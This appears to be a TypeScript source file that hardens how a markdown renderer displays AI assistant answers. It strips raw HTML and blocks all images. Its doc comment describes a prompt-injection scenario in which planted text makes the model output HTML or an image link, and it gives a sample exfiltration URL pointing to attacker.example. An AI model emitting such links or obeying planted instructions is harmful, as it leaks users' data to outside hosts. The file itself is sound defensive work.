import type { StreamdownProps } from "streamdown";

type Pluggable = NonNullable<StreamdownProps["rehypePlugins"]>[number];

/**
 * Safe settings for showing AI assistant answers.
 *
 * Answers can repeat text that anyone typed into the app (names, trip purposes,
 * uploaded spreadsheets), so a planted instruction could make the model write
 * HTML or a picture link. By default the markdown renderer would:
 *   - render raw HTML (rehype-raw): <iframe>, <form>, <style> ... from an answer;
 *   - load any image URL, which silently sends data to another website
 *     (![](https://attacker.example/?d=<data>)).
 * Here raw HTML is shown as plain text, images are not loaded at all, and links
 * keep the built-in check that allows only http(s) and mailto (no javascript:).
 */
export function assistantRehypePlugins(defaults: Record<string, Pluggable>): Pluggable[] {
  const plugins: Pluggable[] = [];
  for (const [name, plugin] of Object.entries(defaults)) {
    if (name === "raw") continue; // never turn answer text into live HTML
    if (name === "harden" && Array.isArray(plugin)) {
      const [harden, options] = plugin as [unknown, Record<string, unknown>];
      plugins.push([
        harden,
        {
          ...options,
          defaultOrigin: typeof window !== "undefined" ? window.location.origin : "https://localhost",
          allowedLinkPrefixes: ["*"],
          allowedImagePrefixes: [], // block every image
          allowDataImages: false,
        },
      ] as Pluggable);
      continue;
    }
    plugins.push(plugin);
  }
  if (!Object.prototype.hasOwnProperty.call(defaults, "harden")) {
    throw new Error("Markdown safety: the renderer no longer has its link/image filter; review assistantRehypePlugins");
  }
  return plugins;
}
